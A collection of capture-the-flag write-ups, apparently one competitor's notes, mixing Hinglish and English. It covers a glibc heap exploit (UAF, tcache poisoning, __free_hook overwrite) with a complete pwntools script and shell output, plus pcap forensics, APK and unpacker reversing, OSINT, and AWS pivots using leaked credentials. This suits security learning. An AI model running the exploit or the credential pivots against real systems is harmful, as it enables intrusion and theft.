+Step 1: Unsorted Bin Leak
+
+create(0x500) large note banaya.
+Top consolidation avoid karne ke liye ek guard chunk create(0x20) banaya.
+large note delete kiya.
+same index pe view kiya.
+
+Kyun kaam karta hai:
+
+freed unsorted chunk ke user area me fd/bk pointers aa jaate hain.
+view stale pointer se wahi bytes print karta hai.
+first qword se mainarena\-adjacent pointer leak hota hai.
+
+Formula used (provided libc ke liye):
+
+libcbase = leak - (malloc hook + 0x70)
+
+Step 2: Tcache Poisoning
+
+Size class pick: 0x80 request (real chunk 0x90 bin)
+
+Actions:
+
+do chunks banaye: A, B (same size)
+free(A) then free(B)
+ab tcache list head = B -> A
+UAF edit(B) karke B->next = freehook likh diya
+
+Allocate twice:
+
+malloc(0x80) => B
+malloc(0x80) => poisoned target freehook
+
+Wahan system address write kar diya.
+
+Step 3: Trigger
+
+ek note me /bin/sh\x00 store kiya
+us note ko delete kiya
+delete internally free(ptr) call karta hai
+since freehook = system, call becomes system("/bin/sh")
+
+Then:
+
+cat /home/notemaker/flag
+
+
+
+Why “Single Free” Enough Nahi Tha
+---------------------------------
+
+Agar sirf ek chunk free karte:
+
+tcache pop ke baad bin empty ho jata.
+poisoned next chain control nahi milta.
+
+Do frees (same size) se linked-list control milta hai (B->next).
+
+
+
+Script
+------
+
+Exploit script path:
+
+/home/parth/exploit.py
+
+Run:
+
+python3 /home/parth/exploit.py REMOTE=1
+
+
+
+
+Practical Notes
+---------------
+
+Target libc expected: glibc 2.30-0ubuntu2.1 (provided libc.so.6).
+Agar remote me offset mismatch aaye, leak-based recalibration karo.
+view me fixed-size recv use karo (size bytes + newline), recvline() unreliable ho sakta hai.
+
+
+
+Final Takeaway
+--------------
+
+Core lifecycle bug tiny tha, impact huge:
+
+stale pointer + stale size + freed chunk reuse
+UAF read + UAF write
+libc leak + tcache poison
+hook overwrite -> code execution
+
+Yahi classic “allocator-adjacent lifecycle bug is load-bearing” pattern hai.
+
+''' #!/usr/bin/env python3
+from pwn import *
+
+HOST = "185.188.249.142"
+PORT = 7777
+
+exe = ELF("/home/parth/babynote", checksec=False)
+libc = ELF("/home/parth/libc.so.6", checksec=False)
+
+context.binary = exe
+context.log_level = "info"
+
+def start():
+if args.REMOTE:
+return remote(HOST, PORT)
+return process("/home/parth/babynote")
+
+def menu(io, choice: int):
+io.sendlineafter(b"> ", str(choice).encode())
+
+def create(io, size: int, data: bytes):
+menu(io, 1)
+io.sendlineafter(b"size? ", str(size).encode())
+io.sendafter(b"content? ", data.ljust(size, b"A")[:size])
+
+def delete(io, idx: int):
+menu(io, 2)
+io.sendlineafter(b"note? ", str(idx).encode())
+
+def view_raw(io, idx: int, size: int) -> bytes:
+menu(io, 3)
+io.sendlineafter(b"note? ", str(idx).encode())
+data = io.recvn(size)
+io.recvn(1) # trailing newline from program
+return data
+
+def edit(io, idx: int, data: bytes):
+menu(io, 4)
+io.sendlineafter(b"note? ", str(idx).encode())
+io.sendafter(b"content? ", data)
+
+def exploit(io):
+# -----------------------------
+# 1) libc leak via unsorted bin
+# -----------------------------
+create(io, 0x500, b"L" * 8) # idx 0 (large chunk, bypass tcache)
+create(io, 0x20, b"G" * 8) # idx 1 (guard chunk to avoid top consolidation)
+
+delete(io, 0) # free large content into unsorted bin
+leak_blob = view_raw(io, 0, 0x500) # UAF read on freed chunk
+leak = u64(leak_blob[:8])
+log.info(f"unsorted leak = {hex(leak)}")
+
+# In glibc 2.30, unsorted fd -> main_arena+0x60, and main_arena is near __malloc_hook.
+# This relation is stable for the supplied libc.
+libc.address = leak - (libc.sym["__malloc_hook"] + 0x70)
+free_hook = libc.sym["__free_hook"]
+system = libc.sym["system"]
+
+log.success(f"libc base = {hex(libc.address)}")
+log.success(f"__free_hook = {hex(free_hook)}")
+log.success(f"system = {hex(system)}")
+
+# -------------------------------------
+# 2) tcache poisoning on size class 0x90
+# -------------------------------------
+create(io, 0x80, b"A" * 8) # idx 2
+create(io, 0x80, b"B" * 8) # idx 3
+
+delete(io, 2)
+delete(io, 3)
+
+# UAF write into freed idx3: overwrite tcache->next with __free_hook
+edit(io, 3, p64(free_hook))
+
+create(io, 0x80, b"C" * 8) # idx 4, returns chunk 3
+create(io, 0x80, p64(system)) # idx 5, returns __free_hook
+
+# --------------------------------------
+# 3) Trigger system("/bin/sh") via free
+# --------------------------------------
+create(io, 0x20, b"/bin/sh\x00") # idx 6
+delete(io, 6)
+
+if __name__ == "__main__":
+io = start()
+exploit(io)
+
+io.sendline(b"cat /home/notemaker/flag")
+io.interactive()
+
+''' python exploit.py
+
+┌──(parth¢Þkali)-[~]
+└─$ python3 /home/parth/exploit.py REMOTE=1
+[+] Opening connection to 185.188.249.142 on port 7777: Done
+[*] unsorted leak = 0x7ee6c701bbe0
+[+] libc base = 0x7ee6c6e31000
+[+] __free_hook = 0x7ee6c701eb20
+[+] system = 0x7ee6c6e864e0
+[*] Switching to interactive mode
+flag{updat3d_n0t3s_uaf_tc4ch3_fr33h00k_a91c5d3e}
+[*] Got EOF while reading in interactive
+$
+
+SuspTeaElS ==
+----------------
+
+tshark -r SuspTeaEl.pcap -Y http.request \
+-T fields -e frame.number -e ip.dst -e http.host -e http.request.uri
+
+
+GET /certificate.der
+Host: 139.162.175.37:8000
+Full URI: http://139.162.175.37:8000/certificate.der
+
+3. Follow TCP stream (tcp.stream == 4) and inspect payload:
+
+tshark -r SuspTeaEl.pcap -q -z follow,tcp,hex,4
+
+
+response includes an HTTP body with DER bytes (30 82 ...) and visible strings such as:
+
+flag{why_1s_my_c3rt Security
+Debug mode: enabled - s0sn4rky}
+
+This indicates the flag is split across certificate fields.
+
+4. Rebuild the DER and parse with OpenSSL:
+
+Extract server payload for stream 4
+(example workflow used during solve)
+tshark -r SuspTeaEl.pcap \
+-Y 'tcp.stream==4 && ip.src==139.162.175.37 && tcp.len>0' \
+-T fields -e tcp.payload | tr -d '\n' > /tmp/stream4server.hex
+
+python3 - <<'PY'
+from pathlib import Path
+hx = Path('/tmp/stream4server.hex').readtext().strip()
+b = bytes.fromhex(hx)
+idx = b.find(b'\r\n\r\n')
+cert = b[idx+4:]
+Path('/tmp/suspiciouscert.der').writebytes(cert)
+print('certlen =', len(cert))
+PY
+
+openssl x509 -in /tmp/suspiciouscert.der -inform der -noout -text
+
+
+5. Parsed certificate fields:
+
+Organization (O): flag{why1smyc3rt Security
+Netscape Comment: Debug mode: enabled - s0sn4rky}
+
+Join the meaningful flag fragments:
+
+flag{why_1s_my_c3rt + _s0_sn4rky}
+
+Flag
+----
+
+flag{why_1s_my_c3rt_s0_sn4rky}
+
+MIC DROP :-
+----------------
+# DeadDrop.apk Writeup
+
+## Challenge Summary
+
+A fitness app (`DeadDrop.apk`) is suspected to be a covert communication tool.
+
+Given hint:
+- Flag is split into 3 parts.
+- Parts must be recovered in order.
+- Final format: `flag{}`
+
+Decompile APK
+
+Use both JADX (Java view) and apktool (resources/smali/assets):
+
+```bash
+jadx -d deaddrop_jadx DeadDrop.apk
+apktool d -f DeadDrop.apk -o deaddrop_apktool
+```
+read androidmanifest.xml:
+
+Main logic is in:
+- `deaddrop_jadx/sources/com/ctf/deaddrop/MainActivity.java`
+
+---
+
+. Recover Part 1
+
+In `MainActivity`:
+
+```java
+private static final String ENCODED_FLAG_PART1 = "c3czYXQxbmdf";
+```
+
+Validation decodes this Base64 and compares user input:
+
+```java
+String decodedFlag = new String(Base64.decode(ENCODED_FLAG_PART1, 0));
+return input.equals(decodedFlag);
+```
+
+Decode:
+
+```bash
+echo -n 'c3czYXQxbmdf' | base64 -d
+```
+
+Part 1:
+
+```text
+sw3at1ng_
+```
+
+---
+
+Recover Part 2
+
+`storeSecondFlagPart()` loads:
+- `assets/encrypted_flag2.bin`
+
+Then stores encrypted content in SQLite under key `specialized_fitness_metric`.
+
+`validateSecondPart()` decrypts that value using AES key derived from **part1**:
+
+```java
+String key = this.firstPartInput.getText().toString();
+String decryptedPart = decryptAES(encryptedPart, key);
+```
+
+AES details:
+- Mode: `AES/CBC/PKCS5Padding`
+- IV: first 16 bytes of decoded blob
+- Key: first 16 bytes of user key string (zero-padded)
+
+Asset value:
+
+```text
+HZa/eR7ArigruTkrnGXuCK9pJq2j0Fxyc8w5uecMsCs=
+```
+
+Decrypting with key `sw3at1ng_` gives:
+
+```text
+f0r_byt3s_w4s_
+```
+
+Part 2:
+
+```text
+f0r_byt3s_w4s_
+```
+
+---
+Recover Part 3
+
+`loadEncryptedFlag3()` loads:
+- `assets/encrypted_flag3.bin`
+
+`validateThirdPart()` decrypts with key = **part2**:
+
+```java
+String key = this.secondPartInput.getText().toString();
+String decryptedPart = decryptAES(this.encryptedFlag3, key);
+```
+
+Asset value:
+
+```text
+9EC4vHer0vtwzGkkJUqbKp8a/Ud2f3wB7unQ/edjDGKFSk7iMXJWQkAMb1sKuxdi60wIqprR2dzjIwt9AvsQuA==
+```
+
+Decrypting with key `f0r_byt3s_w4s_` gives:
+
+```text
+n0t_wh4t_my_f1tn3ss_tr4ck3r_pr0m1s3d!}
+```
+
+Part 3:
+
+```text
+n0t_wh4t_my_f1tn3ss_tr4ck3r_pr0m1s3d!}
+```
+
+---
+
+Final Flag
+
+App builds final flag as:
+
+```java
+"flag{" + part1 + part2 + part3
+```
+
+So final flag is:
+
+```text
+flag{sw3at1ng_f0r_byt3s_w4s_n0t_wh4t_my_f1tn3ss_tr4ck3r_pr0m1s3d!}
+```
+
+---
+
+Covert Channel Explanation
+
+The app pretends to be fitness software but exfiltrates secret data:
+
+- Periodic sync target:
+- `https://deaddropticker.ctf.com/api/sync`
+- Sends both encrypted and plaintext secret in:
+- Header `X-Fitness-Data` (encrypted)
+- Header `X-Fitness-Plaintext` (decrypted)
+- JSON field `flag_part`
+
+Also, location gating is fake:
+- `isNearTargetLocation(...)` always returns `true`.
+- So network sync is effectively always allowed once stage 2 is reached.
+
+This is the covert communication behavior the challenge is modeling.
+
+Challenge 3
+
+Using Unicorn x86:
+
+mapped image memory
+wrote original PE image
+patched IAT thunk addresses used by unpacker
+hooked API calls
+stopped when execution reached real OEP (0x40161F)
+dumped unpacked image to:
+/tmp/MyWare.unpacked.full.bin
+
+After dump, strings and disassembly became readable enough to identify anti-VM logic.
+
+
+
+4\. Locate anti-VM logic
+------------------------
+
+Useful strings in unpacked image
+
+strings -n 4 /tmp/MyWare.unpacked.full.bin | rg -i "anti-vm|memory|processor|globalmemorystatusex"
+
+
+Found:
+
+Anti-VM Triggered. Exiting.
+GlobalMemoryStatusEx
+
+String VA for anti-VM message:
+
+0x40F244
+
+Cross-reference showed call site around:
+
+0x4012C6..0x4012D4 (message box path)
+
+
+
+5\. Control-flow around check
+-----------------------------
+
+Main anti-VM sequence (important part):
+
+004012BD: call 0x4010c0
+004012C2: test eax, eax
+004012C4: jne 0x4012e1
+004012C6: ... "Anti-VM Triggered. Exiting."
+
+
+So function 0x4010C0 returns:
+
+1 => environment accepted
+0 => anti-VM triggered
+
+
+
+Important instructions from that function:
+
+004010D7: lea eax, [ebp-0x44]
+004010DA: push eax
+004010DB: call dword ptr [0x40f034] ; GlobalMemoryStatusEx
+
+... (64-bit division helper call)
+
+004010FB: lea eax, [ebp-0x74]
+004010FE: push eax
+004010FF: call dword ptr [0x40f038] ; GetSystemInfo
+
+0040110B: cmp dword ptr [ebp-0x4c], 0
+0040110F: ja 0x40111a
+00401111: cmp dword ptr [ebp-0x50], 0xffff
+00401118: jb 0x401120
+
+0040111A: cmp dword ptr [ebp-0x48], 8
+0040111E: jae 0x401124
+00401120: xor eax, eax
+00401124: mov eax, 1
+
+
+Meaning of locals
+
+[ebp-0x50]:[ebp-0x4c] = 64-bit value of ullTotalPhys / 0x100000 (RAM in MB)
+[ebp-0x48] = dwNumberOfProcessors
+
+Effective condition
+
+Equivalent logic:
+
+rammb = ullTotalPhys / 1048576;
+ok = (rammb >= 0xFFFF) && (dwNumberOfProcessors >= 8);
+
+
+Threshold constants:
+
+RAM threshold: 0xFFFF MB = 65535 MB
+CPU threshold: 8
+
+
+
+Challenge wants RAM in whole GB integer.
+
+65535 MB / 1024 = 63.999... GB, which maps to the practical whole-number threshold of 64 GB.
+
+So final values:
+
+RAM = 64
+ProcessorCount = 8
+
+
+
+Final flag
+----------
+
+flag{64,8}
+
+Ghost Signal (200) - OSINT Writeup
+
+Challenge:
+Someone named sp3ctr4l_ghost left traces on the internet. We needed to follow the trail and recover the final FLAG{...}.
+
+Methodology:
+1. Enumerate username footprint
+- Searched for sp3ctr4l_ghost across public platforms.
+- Found Reddit profile: u/sp3ctr4l_ghost.
+
+2. Pivot from Reddit to linked social profile
+- Reddit profile had a social link to Mastodon.
+- Opened: @sp3ctr4l_ghost@mastodon.social.
+
+3. Extract clues from Mastodon posts
+- Posts included:
+- Onion-domain hint.
+- A cat image post with wording hint: "Litteerrrsss aaaa llooootttt".
+- Pulled Mastodon post metadata via API.
+- Found hidden attachment description URL:
+https://litter.catbox.moe/00bnxs6yq9x9ifvg.png
+
+4. Analyze downloaded media artifact
+- Downloaded file from litter.catbox URL.
+- File extension was .png, but actual type was JPEG.
+- EXIF metadata contained XP Comment with next pivot:
+https://privatebin.net/?fcd27fb81bcf923b#DVEWffjM67AutWkFqqyGxTEUmHzkjF9b3Hojf3vcJBBV
+
+5. Decrypt PrivateBin payload
+- Pulled JSON API data from PrivateBin (encrypted ct + adata).
+- Decoded fragment after # as Base58 key material.
+- Derived key using PBKDF2-HMAC-SHA256 (100000 rounds) with provided salt.
+
+- Decrypted ciphertext using AES-256-GCM with proper AAD from adata.
+- Decompressed plaintext using raw deflate (zlib, wbits=-15).
+
+6. Decode final encoded string
+- Decrypted chat log contained a long encoded blob.
+- Blob decoded using Ascii85.
+- Output revealed i2p info, password, and final flag.
+
+Recovered Flag:
+FLAG{y0u_f0und_meee_c0nGO_I_AM_pr0ud}
+
+UsortExorcism (300) - Writeup
+
+I just used a directory brute forcer with the help ho common dictionary and I got the folder for the flag . leak.txt. flag{c4ll_us3r_func_rc3_7d2e9f1a}
+
+aws sts get-caller-identity --profile solus
+{
+"UserId": "AIDAUAU4BU6X35AD7LKFY",
+"Account": "276278912943",
+"Arn": "arn:aws:iam::276278912943:user/audit-reader"
+}
+
+To list the functions:
+
+sh-3.2# aws lambda list-functions --region us-east-1 --profile solus
+{
+"Functions": [
+{
+"FunctionName": "notification-sender",
+"FunctionArn": "arn:aws:lambda:us-east-1:276278912943:function:notification-sender",
+"Runtime": "python3.12",
+"Role": "arn:aws:iam::276278912943:role/residualheat-lambda-exec",
+"Handler": "noise.lambda_handler",
+"CodeSize": 196,
+"Description": "",
+"Timeout": 30,
+"MemorySize": 128,
+"LastModified": "2026-04-26T12:59:10.679+0000",
+"CodeSha256": "8yxGiX3+nN7lheHOjV3g5MQxH+zT631avZP0dUfrTbo=",
+"Version": "$LATEST",
+"Environment": {
+"Variables": {
+"WEBHOOK_URL": "REDACTED",
+"CHANNEL": "ops-alerts",
+"ENVIRONMENT": "production"
+}
+},
+
+I found a bucket:
+"FunctionName": "log-archiver",
+"FunctionArn": "arn:aws:lambda:us-east-1:276278912943:function:log-archiver",
+"Runtime": "python3.12",
+"Role": "arn:aws:iam::276278912943:role/residualheat-lambda-exec",
+"Handler": "log_archiver.lambda_handler",
+"CodeSize": 1069,
+"Description": "",
+"Timeout": 60,
+"MemorySize": 128,
+"LastModified": "2026-04-26T12:59:03.007+0000",
+"CodeSha256": "vYryTaReTdtC2L7NgxxtvPBr/92peN2AZe1yNo/dWLQ=",
+"Version": "$LATEST",
+"Environment": {
+"Variables": {
+"ARCHIVE_BUCKET": "residualheat-logs-0a34db20",
+"DB_PASS": "REDACTED",
+"DB_PORT": "5432",
+"DB_USER": "pipeline_ro",
+"ENVIRONMENT": "production",
+"DB_HOST": "internal-db.archivesys.internal",
+"LOG_LEVEL": "INFO"
+}
+},
+"TracingConfig": {
+"Mode": "PassThrough"
+:
+
+I find a archive bucket
+
+aws s3 ls s3://residualheat-logs-0a34db20 I can’t get the permission of this
+
+logs/year=2024/month=11/day=03/pipeline.log
+  logs/year=2024/month=11/day=04/pipeline.log
+  logs/year=2024/month=11/day=05/pipeline.log
+  logs/year=2024/month=11/day=06/pipeline.log
+But I have get object permission
+
+Extract leaked credentials from debug logs
+- In 2024-11-03 log, found:
+  - IAM identity: AKIA****************
+  - secret_key=<REDACTED_AWS_SECRET>
+  - resolved token path /archivesys/pipeline/master-token
+
+New identity with leaked credentials:
+  arn:aws:iam::276278912943:user/archive-worker
+- Direct read on SSM parameter succeeded:
+  /archivesys/pipeline/master-token
+- Returned value was the flag.
+
+Flag
+flag{r3s1du4l_d3bug_l0g_4f3b8c12}
+
+Glacier’s Ledger
+
+1. Enumerate Secrets and ECR
+
+aws secretsmanager list-secrets --max-results 10
+aws secretsmanager get-secret-value --secret-id frigid/app/config-v2
+
+aws ecr describe-repositories --max-results 100
+aws ecr list-images --repository-name coldchain/config-sync
+aws ecr batch-get-image --repository-name coldchain/config-sync --image-ids imageTag=latest
+
+2. Download Small Layer (Credential Leak)
+
+aws ecr get-download-url-for-layer \
+--repository-name coldchain/config-sync \
+--layer-digest sha256:15c8380decb5853497817547eb44a55319dc0023b4298316f15a4c1ab6a2c117
+
+Download and extract:
+
+Invoke-WebRequest -Uri "<DOWNLOAD_URL>" -OutFile ".\layer.tgz"
+tar -xzf .\layer.tgz
+Get-Content .\opt\config\bootstrap.env
+
+This file contains second set of credentials:
+
+AWS_ACCESS_KEY_ID=AKIA****************
+AWS_SECRET_ACCESS_KEY=<REDACTED_AWS_SECRET>
+
+3. Switch to Leaked Credentials
+
+$env:AWS_ACCESS_KEY_ID='AKIA****************'
+$env:AWS_SECRET_ACCESS_KEY='<REDACTED_AWS_SECRET>'
+$env:AWS_DEFAULT_REGION='us-east-1'
+
+aws sts get-caller-identity
+
+4. Explore CodeCommit Repository
+
+aws codecommit list-repositories
+aws codecommit get-repository --repository-name infrastructure-config
+aws codecommit get-branch --repository-name infrastructure-config --branch-name main
+
+aws codecommit get-commit --repository-name infrastructure-config \
+--commit-id 21a3fe28b8ca3cca2ba7bf7fdfc923d777a88799
+
+aws codecommit get-commit --repository-name infrastructure-config \
+--commit-id ce82c8e83d2a9604deab2b487d9a0e71be4e97eb
+
+Check differences:
+
+aws codecommit get-differences \
+--repository-name infrastructure-config \
+--before-commit-specifier ce82c8e83d2a9604deab2b487d9a0e71be4e97eb \
+--after-commit-specifier a8616ddbecad0244ab55d6a9843c15924d8ecf6e
+A deleted file blob is found:
+
+c4f4d6437bae016e183ae4c2d6c929b836dab90f
+
+5. Recover Deleted Blob
+
+aws codecommit get-blob \
+--repository-name infrastructure-config \
+--blob-id c4f4d6437bae016e183ae4c2d6c929b836dab90f \
+--output text
+
+Decode Base64 output:
+
+[Text.Encoding]::UTF8.GetString(
+[Convert]::FromBase64String("<BLOB_BASE64>")
+)
+
+KMS Key ID
+ENCRYPTED_FLAG
+
+6. Decrypt Using AWS KMS
+
+$enc='AQICAHinKkMM6/P3lO28veghuPZSHlEpF3kX1mblSMWqzSJNdQEPHWRyrm8iio2ILS3IsecZAAAAgTB/BgkqhkiG9w0BBwagcjBwAgEAMGsGCSqGSIb3DQEHATAeBglghkgBZQMEAS4wEQQMbfqbz5O9FtDgHVYVAgEQgD4W/2mhflmbtjOLxo8NGuEQCFGmAOoAnH465jGjiC0sbtbjkDRvBV7iZBaTsbBjXDlhnmAsSRIFn91SoWTikA=='
+
+[IO.File]::WriteAllBytes(".\cipher.bin",
+[Convert]::FromBase64String($enc)
+)
+
+aws kms decrypt \
+--ciphertext-blob fileb://cipher.bin \
+--key-id arn:aws:kms:us-east-1:276278912943:key/c6465b05-9a7f-491c-8440-1ffe16ca3001
+
+7. Final Decode
+Output gives Base64 plaintext:
+
+ZmxhZ3tjMGxkX2NoNDFuX2w0eTNyX2cxdF83YTlmMmU0Y30=
+
+Decode it:
+
+[Text.Encoding]::UTF8.GetString(
+[Convert]::FromBase64String('ZmxhZ3tjMGxkX2NoNDFuX2w0eTNyX2cxdF83YTlmMmU0Y30=')
+)
+
+flag{c0ld_ch41n_l4y3r_g1t_7a9f2e4c}
+
